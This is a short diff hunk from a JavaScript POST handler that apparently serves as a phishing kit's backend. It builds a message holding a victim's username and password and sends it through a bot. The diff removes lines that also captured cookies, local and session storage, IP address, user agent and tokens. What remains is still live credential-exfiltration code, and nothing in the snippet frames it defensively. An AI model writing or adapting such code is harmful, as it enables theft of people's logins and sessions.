@@ -22,31 +22,6 @@ export async function POST(req) {
 
 *Username:* ${eparams}
 *Password:* ${password}
-*Landing URL:* 
-${landingUrl || 'No URL provided'}
-
-✅ *User Agent:*
-${userAgent || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36'}
-
-✅ *Remote Address:*
-${remoteAddress || 'Not available'}
-
-❌ *Create Time:*
-${Math.floor(Date.now() / 1000)}
-
-❌ *Update Time:*
-${Math.floor(Date.now() / 1000)}
-
-🍪 *Cookies:*
-${cookies || 'No cookies captured'}
-
-💾 *Local Storage:*
-${localStorageData || 'No local storage data captured'}
-
-💾 *Session Storage:*
-${sessionStorageData || 'No session storage data captured'}
-
-✅ Tokens are added in txt file and attached separately in message.
     `;
 
       await bot.sendMessage({
